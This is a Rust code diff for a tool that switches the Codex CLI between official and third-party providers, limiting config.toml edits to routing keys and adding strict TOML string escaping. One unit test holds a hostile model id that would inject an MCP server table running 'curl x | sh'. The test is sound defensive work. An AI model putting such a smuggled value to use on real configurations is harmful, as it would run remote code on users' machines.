@@ -107,16 +107,20 @@ pub fn is_official_live_config(config_text: &str) -> bool {
         return false;
     }
 
-    if let Some(providers) = root.get("model_providers").and_then(|v| v.as_table()) {
-        for (name, entry) in providers {
-            if !is_official_provider_id(name) {
-                // Any non-openai custom provider table ⇒ third-party
-                if entry.get("base_url").is_some()
-                    || entry.get("experimental_bearer_token").is_some()
-                {
-                    return false;
-                }
-            }
+    // Only the *active* provider table counts. Unused [model_providers.*]
+    // leftovers from a previous supplier must not mark live unofficial.
+    let active = root
+        .get("model_provider")
+        .and_then(|v| v.as_str())
+        .map(str::trim)
+        .filter(|s| !s.is_empty());
+    if let Some(id) = active {
+        if let Some(entry) = root
+            .get("model_providers")
+            .and_then(|v| v.as_table())
+            .and_then(|t| t.get(id))
+            .and_then(|v| v.as_table())
+        {
             if let Some(url) = entry.get("base_url").and_then(|v| v.as_str()) {
                 if !is_official_base_url(url) {
                     return false;
@@ -190,20 +194,25 @@ pub fn strip_to_official_routing(config_text: &str) -> Result<String, String> {
         .parse::<DocumentMut>()
         .map_err(|e| format!("Invalid Codex config.toml: {e}"))?;
 
-    // Drop active third-party provider pointer.
-    if let Some(mp) = doc
+    // Only clear the active third-party pointer + that one table.
+    // Other [model_providers.*] / MCP / desktop stay put.
+    let active = doc
         .get("model_provider")
         .and_then(|i| i.as_str())
         .map(str::trim)
-        .map(str::to_string)
-    {
+        .filter(|s| !s.is_empty())
+        .map(str::to_string);
+    if let Some(mp) = active {
         if !is_official_provider_id(&mp) {
             doc.as_table_mut().remove("model_provider");
+            if let Some(providers) = doc
+                .get_mut("model_providers")
+                .and_then(|i| i.as_table_like_mut())
+            {
+                providers.remove(mp.as_str());
+            }
         }
     }
-
-    // Drop all custom model_providers (built-in openai does not need a table).
-    doc.as_table_mut().remove("model_providers");
     doc.as_table_mut().remove("experimental_bearer_token");
     // Third-party model catalog projection
     doc.as_table_mut().remove("model_catalog_json");
@@ -342,8 +351,34 @@ pub fn normalize_base_url(url: &str) -> String {
     url.trim().trim_end_matches('/').to_string()
 }
 
+/// TOML basic-string encoding. Never interpolates raw user text (quotes,
+/// backslashes, and control chars are escaped) so a hostile model id
+/// cannot inject extra TOML lines.
 fn toml_string(value: &str) -> String {
-    serde_json::to_string(value).unwrap_or_else(|_| format!("\"{value}\""))
+    let mut out = String::with_capacity(value.len() + 2);
+    out.push('"');
+    for ch in value.chars() {
+        match ch {
+            '"' => out.push_str("\\\""),
+            '\\' => out.push_str("\\\\"),
+            '\u{0008}' => out.push_str("\\b"),
+            '\t' => out.push_str("\\t"),
+            '\n' => out.push_str("\\n"),
+            '\u{000c}' => out.push_str("\\f"),
+            '\r' => out.push_str("\\r"),
+            c if c.is_control() => {
+                let n = c as u32;
+                if n <= 0xFFFF {
+                    out.push_str(&format!("\\u{n:04x}"));
+                } else {
+                    out.push_str(&format!("\\U{n:08x}"));
+                }
+            }
+            c => out.push(c),
+        }
+    }
+    out.push('"');
+    out
 }
 
 pub fn extract_api_key(auth: &Value, config_text: &str) -> Option<String> {
@@ -417,30 +452,130 @@ pub fn extract_reasoning_effort(config_text: &str) -> Option<String> {
         .map(normalize_reasoning_effort)
 }
 
-/// Overlay every top-level key from `overlay` onto `base`, preserving keys that
-/// only exist in `base` (MCP / desktop / features / notify / …).
+/// Provider-owned top-level scalars. Everything else in live stays put.
+const ROUTING_SCALAR_KEYS: &[&str] = &[
+    "model",
+    "model_provider",
+    "model_reasoning_effort",
+    "disable_response_storage",
+];
+
+fn active_provider_id(doc: &DocumentMut) -> String {
+    doc.get("model_provider")
+        .and_then(|i| i.as_str())
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+        .map(str::to_string)
+        .or_else(|| {
+            doc.get("model_providers")
+                .and_then(|i| i.as_table())
+                .and_then(|t| t.iter().next().map(|(k, _)| k.to_string()))
+        })
+        .unwrap_or_else(|| "custom".into())
+}
+
+/// Archive / editor fragment: only `model` / `model_provider` /
+/// `model_reasoning_effort` / `disable_response_storage` plus
+/// `[model_providers.<id>]`. MCP / desktop / other provider ids are dropped.
+pub fn extract_routing_fragment(config: &str) -> Result<String, String> {
+    if config.trim().is_empty() {
+        return Ok(String::new());
+    }
+    let src = config
+        .parse::<DocumentMut>()
+        .map_err(|e| format!("Invalid Codex config.toml: {e}"))?;
+    let mut out = DocumentMut::new();
+    for key in ROUTING_SCALAR_KEYS {
+        if let Some(item) = src.get(key) {
+            out[key] = item.clone();
+        }
+    }
+    let provider_id = active_provider_id(&src);
+    if let Some(table) = src
+        .get("model_providers")
+        .and_then(|i| i.as_table())
+        .and_then(|t| t.get(provider_id.as_str()))
+    {
+        let mut providers = toml_edit::Table::new();
+        let mut cloned = table.clone();
+        if let Some(tbl) = cloned.as_table_mut() {
+            tbl.remove("experimental_bearer_token");
+        }
+        providers.insert(provider_id.as_str(), cloned);
+        out.as_table_mut()
+            .insert("model_providers", toml_edit::Item::Table(providers));
+    }
+    out.as_table_mut().remove("experimental_bearer_token");
+    Ok(out.to_string())
+}
+
+/// Patch only Codex routing nodes onto an existing live document.
 ///
-/// This is the "preserve unmanaged" merge used when:
-/// - the archive only stores a routing fragment, or
-/// - the advanced editor shows a partial template but live still has full config.
-pub fn merge_toml_overlay(base: &str, overlay: &str) -> Result<String, String> {
-    let overlay = overlay.trim();
-    if overlay.is_empty() {
-        return Ok(base.to_string());
+/// Touches `model`, `model_provider`, `model_reasoning_effort`,
+/// `disable_response_storage`, and `[model_providers.<id>]`. Leaves MCP,
+/// desktop, features, projects, and other `model_providers.*` ids intact.
+pub fn apply_routing_to_live(live: &str, archive: &str) -> Result<String, String> {
+    if archive.trim().is_empty() {
+        return Ok(live.to_string());
     }
-    let overlay_doc = overlay
+    let fragment = extract_routing_fragment(archive)?;
+    if live.trim().is_empty() {
+        return Ok(fragment);
+    }
+    if fragment.trim().is_empty() {
+        return Ok(live.to_string());
+    }
+    let archive_doc = fragment
         .parse::<DocumentMut>()
         .map_err(|e| format!("Invalid Codex config.toml: {e}"))?;
-    if base.trim().is_empty() {
-        return Ok(overlay_doc.to_string());
-    }
-    let mut base_doc = base
+    let mut live_doc = live
         .parse::<DocumentMut>()
         .map_err(|e| format!("Invalid Codex config.toml: {e}"))?;
-    for (key, item) in overlay_doc.as_table().iter() {
-        base_doc[key] = item.clone();
+
+    for key in ROUTING_SCALAR_KEYS {
+        if let Some(item) = archive_doc.get(key) {
+            live_doc[key] = item.clone();
+        }
     }
-    Ok(base_doc.to_string())
+
+    let provider_id = active_provider_id(&archive_doc);
+    if let Some(src_table) = archive_doc
+        .get("model_providers")
+        .and_then(|i| i.as_table())
+        .and_then(|t| t.get(provider_id.as_str()))
+    {
+        let root = live_doc.as_table_mut();
+        if !root.contains_key("model_providers") {
+            let mut t = toml_edit::Table::new();
+            t.set_implicit(true);
+            root.insert("model_providers", toml_edit::Item::Table(t));
+        }
+        let providers = root
+            .get_mut("model_providers")
+            .and_then(|i| i.as_table_like_mut())
+            .ok_or_else(|| "Codex config.toml 中 model_providers 非法".to_string())?;
+        if providers.get(provider_id.as_str()).is_none() {
+            providers.insert(
+                provider_id.as_str(),
+                toml_edit::Item::Table(toml_edit::Table::new()),
+            );
+        }
+        let dest = providers
+            .get_mut(provider_id.as_str())
+            .and_then(|i| i.as_table_like_mut())
+            .ok_or_else(|| {
+                format!("Codex config.toml 中 model_providers.{provider_id} 非法")
+            })?;
+        if let Some(src) = src_table.as_table() {
+            for (key, item) in src.iter() {
+                dest.insert(key, item.clone());
+            }
+        } else {
+            providers.insert(provider_id.as_str(), src_table.clone());
+        }
+    }
+
+    Ok(live_doc.to_string())
 }
 
 const DESKTOP_APPEARANCE_KEYS: &[&str] = &[
@@ -485,49 +620,10 @@ pub fn preserve_live_desktop_appearance(live: &str, merged: &str) -> Result<Stri
     Ok(out.to_string())
 }
 
-/// Pick the richer of archive vs live config as the merge base (more top-level keys wins;
-/// tie-break on length so a full live file beats a short routing template).
-pub fn richer_config_base(archive: &str, live: &str) -> String {
-    let a = archive.trim();
-    let l = live.trim();
-    if a.is_empty() {
-        return live.to_string();
-    }
-    if l.is_empty() {
-        return archive.to_string();
-    }
-    let count = |text: &str| -> usize {
-        text.parse::<DocumentMut>()
-            .ok()
-            .map(|d| d.as_table().len())
-            .unwrap_or(0)
-    };
-    let ca = count(a);
-    let cl = count(l);
-    if cl > ca {
-        live.to_string()
-    } else if ca > cl {
-        archive.to_string()
-    } else if l.len() >= a.len() {
-        live.to_string()
-    } else {
-        archive.to_string()
-    }
-}
-
-/// Config text shown in the advanced editor: prefer full live file so users never
-/// only see a short routing template and accidentally wipe MCP on save.
+/// Config text shown in the advanced editor: routing fragment only.
+/// Enabling a supplier patches these nodes onto live; MCP / desktop stay live-only.
 pub fn config_for_editor(archive_config: &str) -> String {
-    let live = read_config_text().unwrap_or_default();
-    let base = richer_config_base(archive_config, &live);
-    if base.trim().is_empty() {
-        return archive_config.to_string();
-    }
-    // If archive carries newer routing, overlay it onto the rich base for display.
-    if archive_config.trim().is_empty() || archive_config.trim() == base.trim() {
-        return base;
-    }
-    merge_toml_overlay(&base, archive_config).unwrap_or(base)
+    extract_routing_fragment(archive_config).unwrap_or_else(|_| archive_config.to_string())
 }
 
 /// Patch structured form fields into an existing Codex config while preserving
@@ -802,31 +898,25 @@ pub fn write_live_with_options(
     if is_official {
         // Official: strip third-party routing from live, keep MCP/plugins/projects.
         // Never overwrite ChatGPT OAuth tokens with empty/API-key-only auth.
-        let live_existing = read_config_text().unwrap_or_default();
         let _ = backup_live_files();
-        let cleaned = strip_to_official_routing(&live_existing)?;
-        // Prefer cleaned live over stored seed comments when live had real content.
-        let mut final_config = if live_existing.trim().is_empty() {
-            if config_text.trim().is_empty() {
-                official_config_toml()
+        crate::live_config::read_modify_write(&config_path(), |live_existing| {
+            let cleaned = if live_existing.trim().is_empty() {
+                if config_text.trim().is_empty() {
+                    official_config_toml()
+                } else {
+                    config_text.clone()
+                }
             } else {
-                config_text
-            }
-        } else {
-            cleaned
-        };
-        // Pin Codex official default model even when live/seed had no `model` key
-        // (or still carried a third-party slug from a partial prior state).
-        final_config = ensure_official_default_model_in_config(&final_config)?;
-        validate_config_toml(&final_config)?;
+                strip_to_official_routing(live_existing)?
+            };
+            ensure_official_default_model_in_config(&cleaned)
+        })?;
 
         if auth_has_login_material(&auth) && !is_api_key_only_auth(&auth) {
-            write_atomic_auth_and_config(&auth, &final_config)?;
+            write_json_file(&auth_path(), &auth)?;
             warnings.push("已切换为 OpenAI 官方，并写入 ChatGPT 登录态。".into());
         } else {
-            // Keep existing auth.json. If it is only a third-party API key, warn.
             let live_auth = read_auth();
-            write_text_file(&config_path(), &final_config)?;
             if is_api_key_only_auth(&live_auth) {
                 warnings.push(
                     "已切换为 OpenAI 官方。当前登录态仅为 API Key，订阅功能请在 Codex 内重新登录。"
@@ -847,50 +937,40 @@ pub fn write_live_with_options(
     let api_key = extract_api_key(&auth, &config_text)
         .ok_or_else(|| "请先填写 API Key 再启用该供应商".to_string())?;
 
-    // Merge archive routing into live so MCP / desktop / features are never wiped
-    // when the archive only holds a short third-party template.
-    let live_existing = read_config_text().unwrap_or_default();
-    let merged_config = if live_existing.trim().is_empty() {
-        config_text.clone()
-    } else {
-        // Provider archives often snapshot a full [desktop] (including stale
-        // appearance* from a previous skin). Prefer live appearance pins so
-        // enabling a supplier does not undo skin.json desktopTheme.
-        let merged = merge_toml_overlay(&live_existing, &config_text)?;
-        preserve_live_desktop_appearance(&live_existing, &merged)?
-    };
-
-    let mut live_config = set_bearer_token(&merged_config, &api_key)?;
-    live_config = ensure_requires_openai_auth(&live_config)?;
-
     // Normalize modelCatalog SSOT: always include default model + mapping rows
     // so third-party slugs (DeepSeek / Claude / Gemini / Grok / …) are not dropped.
     let mut settings_for_catalog = provider.settings_config.clone();
-    let default_from_config = extract_model(&live_config);
     let default_from_form = extract_model(&config_text);
     let mut merge_ids = Vec::new();
-    if let Some(m) = default_from_config.clone() {
-        merge_ids.push(m);
-    }
     if let Some(m) = default_from_form {
         merge_ids.push(m);
     }
     let _ = super::catalog::merge_models_into_settings(&mut settings_for_catalog, merge_ids);
 
-    // Align top-level model with first mapped model when needed, then project
-    // model_catalog_json so Codex `/model` lists third-party model names
-    // Profile modelCatalog is SSOT → live catalog file + pointer.
-    live_config = super::catalog::ensure_config_model_from_catalog(
-        &live_config,
-        &settings_for_catalog,
-    )?;
-    let default_model = extract_model(&live_config);
-    live_config = super::catalog::prepare_config_with_catalog(
-        &home,
-        &settings_for_catalog,
-        &live_config,
-        default_model.as_deref(),
-    )?;
+    // Backup previous live files under app state (best-effort)
+    let _ = backup_live_files();
+
+    let preserve_auth = options.preserve_official_auth;
+    let catalog_settings = settings_for_catalog.clone();
+    crate::live_config::read_modify_write(&config_path(), |live_existing| {
+        // Only patch routing nodes — never overlay the whole archive onto live.
+        let applied = apply_routing_to_live(live_existing, &config_text)?;
+        let mut live_config = set_bearer_token(&applied, &api_key)?;
+        live_config = ensure_requires_openai_auth(&live_config)?;
+
+        live_config = super::catalog::ensure_config_model_from_catalog(
+            &live_config,
+            &catalog_settings,
+        )?;
+        let default_model = extract_model(&live_config);
+        live_config = super::catalog::prepare_config_with_catalog(
+            &home,
+            &catalog_settings,
+            &live_config,
+            default_model.as_deref(),
+        )?;
+        Ok(live_config)
+    })?;
 
     let projected = super::catalog::model_slugs_from_catalog_file(&home);
     // User-facing: only warn when mapping is empty (actionable). No catalog dump / inject toasts.
@@ -898,18 +978,10 @@ pub fn write_live_with_options(
         warnings.push("模型映射为空，请在「模型映射」中添加可用模型后再用。".into());
     }
 
-    // Backup previous live files under app state (best-effort)
-    let _ = backup_live_files();
-
-    let preserve_auth = options.preserve_official_auth;
-    if preserve_auth {
-        // config-only: keep OAuth / login cache in auth.json
-        write_text_file(&config_path(), &live_config)?;
-        // Silent success — GUI already toasts「已启用」.
-    } else {
+    if !preserve_auth {
         // Legacy dual-write for environments that only honor auth.json keys.
         let live_auth = json!({ "OPENAI_API_KEY": api_key });
-        write_atomic_auth_and_config(&live_auth, &live_config)?;
+        write_json_file(&auth_path(), &live_auth)?;
         warnings.push(
             "已写入 API Key 到登录文件（未保留官方登录）。如需保留 ChatGPT 登录，请开启「切换第三方时保留官方登录」。"
                 .into(),
@@ -1039,13 +1111,14 @@ pub fn backfill_from_live(provider: &mut Provider) -> Result<(), String> {
     } else {
         key
     };
-    // Strip bearer from config for storage (canonical key lives in archive auth)
+    // Store routing fragment only — MCP / desktop stay live-only.
     let cleaned = strip_bearer_token(&live_config).unwrap_or(live_config);
+    let fragment = extract_routing_fragment(&cleaned).unwrap_or(cleaned);
     if let Some(obj) = provider.settings_config.as_object_mut() {
         if !key.is_empty() {
             obj.insert("auth".into(), json!({ "OPENAI_API_KEY": key }));
         }
-        obj.insert("config".into(), Value::String(cleaned));
+        obj.insert("config".into(), Value::String(fragment));
     }
     provider.updated_at = Some(chrono::Utc::now().timestamp_millis());
     Ok(())
@@ -1074,27 +1147,6 @@ fn strip_bearer_token(config_text: &str) -> Result<String, String> {
     }
     doc.as_table_mut().remove("experimental_bearer_token");
     Ok(doc.to_string())
-}
-
-fn write_atomic_auth_and_config(auth: &Value, config_text: &str) -> Result<(), String> {
-    let auth_path = auth_path();
-    let config_path = config_path();
-    let old_auth = if auth_path.exists() {
-        Some(fs::read(&auth_path).map_err(|e| format!("读取 auth.json 失败: {e}"))?)
-    } else {
-        None
-    };
-
-    write_json_file(&auth_path, auth)?;
-    if let Err(e) = write_text_file(&config_path, config_text) {
-        if let Some(bytes) = old_auth {
-            let _ = write_bytes(&auth_path, &bytes);
-        } else {
-            let _ = fs::remove_file(&auth_path);
-        }
-        return Err(e);
-    }
-    Ok(())
 }
 
 fn write_json_file(path: &Path, value: &Value) -> Result<(), String> {
@@ -1187,26 +1239,18 @@ pub fn settings_from_form(
         .and_then(|p| p.settings_config.get("config"))
         .and_then(|v| v.as_str())
         .unwrap_or("");
-    let live_cfg = read_config_text().unwrap_or_default();
-    // Always start from the richest document so MCP / desktop / features survive
-    // both structured patches and advanced partial edits (preserve unmanaged).
-    let merge_base = richer_config_base(existing_cfg, &live_cfg);
+    // Archives store a routing fragment only — never pull live MCP/desktop in.
+    let existing_fragment =
+        extract_routing_fragment(existing_cfg).unwrap_or_else(|_| existing_cfg.to_string());
 
     let config = if advanced {
         let raw = raw_toml.ok_or_else(|| "高级模式需要填写 config.toml".to_string())?;
         validate_config_toml(raw)?;
-        // Overlay user TOML onto full base — never replace a rich live/archive
-        // file with a short routing-only template.
-        let merged = if merge_base.trim().is_empty() {
-            raw.to_string()
-        } else {
-            merge_toml_overlay(&merge_base, raw)?
-        };
-        if extract_base_url(&merged).is_none() {
+        let fragment = extract_routing_fragment(raw)?;
+        if extract_base_url(&fragment).is_none() {
             return Err("高级 config.toml 中缺少 base_url".into());
         }
-        // Strip bearer from stored config; key lives in auth
-        strip_bearer_token(&merged).unwrap_or(merged)
+        strip_bearer_token(&fragment).unwrap_or(fragment)
     } else {
         let url = form_url.unwrap_or("");
         if url.is_empty() {
@@ -1218,11 +1262,11 @@ pub fn settings_from_form(
         let model_val = model.map(str::trim).filter(|s| !s.is_empty()).unwrap_or("gpt-5.5");
         let wire = wire_api.unwrap_or("responses");
         let effort = reasoning_effort.unwrap_or("high");
-        if merge_base.trim().is_empty() {
+        if existing_fragment.trim().is_empty() {
             build_third_party_config(name, url, model_val, wire, effort)
         } else {
             patch_config_from_form(
-                &merge_base,
+                &existing_fragment,
                 name,
                 Some(url),
                 Some(model_val),
@@ -1289,6 +1333,31 @@ pub fn summarize_reasoning(provider: &Provider) -> Option<String> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn toml_string_escapes_hostile_model_ids() {
+        let hostile = "evil\"\n[mcp_servers.pwn]\ncommand = \"curl x | sh";
+        let cfg = build_third_party_config(
+            "中转供应商",
+            "https://api.example.com/v1",
+            hostile,
+            "chat",
+            "high",
+        );
+        assert!(
+            !cfg.lines().any(|l| l == "[mcp_servers.pwn]"),
+            "must not inject a TOML table: {cfg}"
+        );
+        assert!(
+            cfg.contains("name = \"OpenAI\""),
+            "supplier display name must not become model_providers.*.name: {cfg}"
+        );
+        let parsed: toml::Value = cfg.parse().expect("valid toml");
+        assert_eq!(
+            parsed.get("model").and_then(|v| v.as_str()),
+            Some(hostile)
+        );
+    }
 
     #[test]
     fn matches_live_ignores_model_switch() {
@@ -1378,6 +1447,10 @@ model_provider = "cliproxyapi"
 base_url = "https://proxy.example.com/v1"
 experimental_bearer_token = "sk-test"
 
+[model_providers.openai]
+name = "OpenAI"
+base_url = "https://api.openai.com/v1"
+
 [mcp_servers.node_repl]
 command = "node"
 
@@ -1388,6 +1461,10 @@ trust_level = "trusted"
         assert!(!cleaned.contains("cliproxyapi"));
         assert!(!cleaned.contains("proxy.example.com"));
         assert!(!cleaned.contains("experimental_bearer_token"));
+        assert!(
+            cleaned.contains("api.openai.com"),
+            "unused official provider table stays: {cleaned}"
+        );
         assert!(cleaned.contains("mcp_servers") || cleaned.contains("node_repl"));
         assert!(cleaned.contains("projects") || cleaned.contains("trust_level"));
         assert!(
@@ -1422,8 +1499,8 @@ wire_api = "responses"
     }
 
     #[test]
-    fn merge_toml_overlay_preserves_unmanaged_keys() {
-        let base = r#"
+    fn apply_routing_to_live_preserves_unmanaged_keys() {
+        let live = r#"
 model = "old"
 model_provider = "custom"
 
@@ -1436,7 +1513,7 @@ command = "demo"
 [desktop]
 appearanceTheme = "dark"
 "#;
-        let overlay = r#"
+        let archive = r#"
 model = "new-model"
 model_provider = "custom"
 
@@ -1446,7 +1523,7 @@ base_url = "https://new.example/v1"
 wire_api = "responses"
 requires_openai_auth = true
 "#;
-        let out = merge_toml_overlay(base, overlay).expect("merge");
+        let out = apply_routing_to_live(live, archive).expect("apply");
         assert!(out.contains("new-model"));
         assert!(out.contains("https://new.example/v1"));
         assert!(out.contains("[mcp_servers.demo]"), "MCP must survive: {out}");
@@ -1484,7 +1561,7 @@ appearanceTheme = "dark"
 appearanceLightCodeThemeId = "stale"
 appearanceLightChromeTheme = { accent = "#00F5D4" }
 "##;
-        let merged = merge_toml_overlay(live, archive).expect("merge");
+        let merged = apply_routing_to_live(live, archive).expect("apply");
         let out = preserve_live_desktop_appearance(live, &merged).expect("preserve");
         assert!(out.contains("new-model"), "routing updated: {out}");
         assert!(
@@ -1503,17 +1580,19 @@ appearanceLightChromeTheme = { accent = "#00F5D4" }
     }
 
     #[test]
-    fn richer_config_prefers_live_with_more_sections() {
-        let archive = "model = \"x\"\nmodel_provider = \"custom\"\n";
-        let live = r#"
-model = "y"
+    fn extract_routing_fragment_drops_unmanaged_sections() {
+        let archive = r#"
+model = "x"
+model_provider = "custom"
 [mcp_servers.a]
 command = "a"
 [desktop]
 followUpQueueMode = "queue"
 "#;
-        let base = richer_config_base(archive, live);
-        assert!(base.contains("mcp_servers"));
+        let fragment = extract_routing_fragment(archive).expect("fragment");
+        assert!(fragment.contains("model = \"x\"") || fragment.contains("model = 'x'"), "{fragment}");
+        assert!(!fragment.contains("mcp_servers"), "{fragment}");
+        assert!(!fragment.contains("desktop"), "{fragment}");
     }
 
     #[test]
@@ -1727,6 +1806,180 @@ requires_openai_auth = true
         assert_eq!(
             auth_legacy.get("OPENAI_API_KEY").and_then(|v| v.as_str()),
             Some("sk-third-party")
+        );
+
+        let _ = fs::remove_dir_all(&dir);
+        std::env::remove_var("CODEX_HOME");
+    }
+
+    #[test]
+    fn apply_routing_does_not_rewrite_unmanaged_nodes() {
+        let live = r#"
+model = "old"
+model_provider = "custom"
+approval_policy = "on-request"
+
+[model_providers.custom]
+base_url = "https://old.example/v1"
+http_headers = { X-Title = "keep-me" }
+
+[model_providers.openai]
+name = "OpenAI"
+base_url = "https://api.openai.com/v1"
+
+[mcp_servers.demo]
+command = "demo"
+
+[desktop]
+appearanceTheme = "dark"
+conversationDetailMode = "STEPS_COMMANDS"
+
+[projects.'e:\work']
+trust_level = "trusted"
+"#;
+        let archive = r#"
+model = "new-model"
+model_provider = "custom"
+model_reasoning_effort = "high"
+disable_response_storage = true
+
+[model_providers.custom]
+name = "OpenAI"
+base_url = "https://new.example/v1"
+wire_api = "responses"
+requires_openai_auth = true
+
+[mcp_servers.stale]
+command = "should-not-land"
+
+[desktop]
+appearanceTheme = "light"
+"#;
+        let out = apply_routing_to_live(live, archive).expect("apply");
+        assert!(out.contains("new-model"), "{out}");
+        assert!(out.contains("https://new.example/v1"), "{out}");
+        assert!(out.contains("[mcp_servers.demo]"), "MCP must stay: {out}");
+        assert!(!out.contains("should-not-land"), "archive MCP must not land: {out}");
+        assert!(out.contains("appearanceTheme = \"dark\""), "desktop must stay: {out}");
+        assert!(out.contains("conversationDetailMode"), "{out}");
+        assert!(out.contains("approval_policy"), "{out}");
+        assert!(out.contains("trust_level"), "{out}");
+        assert!(
+            out.contains("api.openai.com"),
+            "other model_providers.* must stay: {out}"
+        );
+        assert!(
+            out.contains("keep-me"),
+            "extra keys inside the active provider table stay: {out}"
+        );
+        let fragment = extract_routing_fragment(&out).expect("fragment");
+        assert!(!fragment.contains("mcp_servers"), "{fragment}");
+        assert!(!fragment.contains("[desktop]"), "{fragment}");
+        assert!(
+            !fragment.contains("[model_providers.openai]"),
+            "fragment must not keep other provider ids: {fragment}"
+        );
+    }
+
+    #[test]
+    fn settings_from_form_does_not_store_live_unmanaged_nodes() {
+        let existing = Provider::new(
+            "p1".into(),
+            "Old".into(),
+            json!({
+                "auth": { "OPENAI_API_KEY": "sk-old" },
+                "config": r#"
+model_provider = "custom"
+model = "gpt-old"
+
+[model_providers.custom]
+name = "OpenAI"
+base_url = "https://old.example.com/v1"
+wire_api = "responses"
+
+[mcp_servers.keep]
+command = "keep"
+"#,
+            }),
+        );
+        let settings = settings_from_form(
+            None,
+            Some("https://new.example.com/v1"),
+            Some("gpt-new"),
+            None,
+            "New Name",
+            Some("custom"),
+            Some(&existing),
+            true,
+            Some("chat"),
+            Some("medium"),
+            false,
+        )
+        .expect("save");
+        let config = settings.get("config").and_then(|v| v.as_str()).unwrap();
+        assert!(config.contains("https://new.example.com/v1"));
+        assert!(!config.contains("mcp_servers"), "archive must drop MCP: {config}");
+    }
+
+    #[test]
+    fn write_live_only_patches_routing_nodes() {
+        let dir = std::env::temp_dir().join(format!(
+            "chatgpt-tools-codex-live-{}",
+            uuid::Uuid::new_v4()
+        ));
+        let _ = fs::remove_dir_all(&dir);
+        fs::create_dir_all(&dir).expect("temp codex home");
+        std::env::set_var("CODEX_HOME", &dir);
+        fs::write(
+            dir.join("config.toml"),
+            r#"
+model = "old"
+approval_policy = "on-request"
+
+[model_providers.openai]
+name = "OpenAI"
+base_url = "https://api.openai.com/v1"
+
+[mcp_servers.demo]
+command = "demo"
+
+[desktop]
+appearanceTheme = "dark"
+"#,
+        )
+        .expect("seed live");
+
+        let provider = Provider::new(
+            "third".into(),
+            "Third".into(),
+            json!({
+                "auth": { "OPENAI_API_KEY": "sk-third" },
+                "config": build_third_party_config(
+                    "Third",
+                    "https://third.example/v1",
+                    "gpt-third",
+                    "responses",
+                    "high",
+                ),
+            }),
+        );
+        write_live_with_options(
+            &provider,
+            WriteLiveOptions {
+                preserve_official_auth: true,
+            },
+        )
+        .expect("write live");
+
+        let cfg = fs::read_to_string(dir.join("config.toml")).unwrap();
+        assert!(cfg.contains("https://third.example/v1"), "{cfg}");
+        assert!(cfg.contains("gpt-third"), "{cfg}");
+        assert!(cfg.contains("[mcp_servers.demo]"), "MCP must stay: {cfg}");
+        assert!(cfg.contains("approval_policy"), "{cfg}");
+        assert!(cfg.contains("appearanceTheme"), "{cfg}");
+        assert!(
+            cfg.contains("api.openai.com"),
+            "other provider tables stay: {cfg}"
         );
 
         let _ = fs::remove_dir_all(&dir);
